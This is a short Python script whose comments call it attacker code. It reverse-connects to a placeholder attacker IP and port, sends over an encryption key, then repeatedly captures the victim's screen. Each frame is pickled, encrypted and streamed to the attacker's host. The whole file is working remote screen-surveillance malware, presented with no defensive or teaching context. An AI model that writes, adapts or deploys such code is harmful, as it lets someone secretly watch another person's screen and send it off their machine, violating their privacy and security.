import socket
import struct
import pickle
import cv2
import mss
import numpy as np
from cryptography.fernet import Fernet

# Attacker's IP and Port
HOST = PLACEHOLDER_IP
PORT = PLACEHOLDER_PORT

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))  # Reverse connect to the attacker

print(f"[+] Connected")

key = Fernet.generate_key()
cipher = Fernet(key)

client.send(key)  # Send key to attacker for decryption

sct = mss.mss()

while True:
    screenshot = sct.grab(sct.monitors[1])  # Capture screen
    frame = np.array(screenshot)  # Convert to NumPy array
    frame = cv2.resize(frame, (800, 450))  # Resize

    # Serialize and encrypt the frame directly
    data = pickle.dumps(frame)  # Serialize raw frame
    encrypted_data = cipher.encrypt(data)  # Encrypt

    message = struct.pack("Q", len(encrypted_data)) + encrypted_data

    try:
        client.sendall(message)
    except:
        break

client.close()
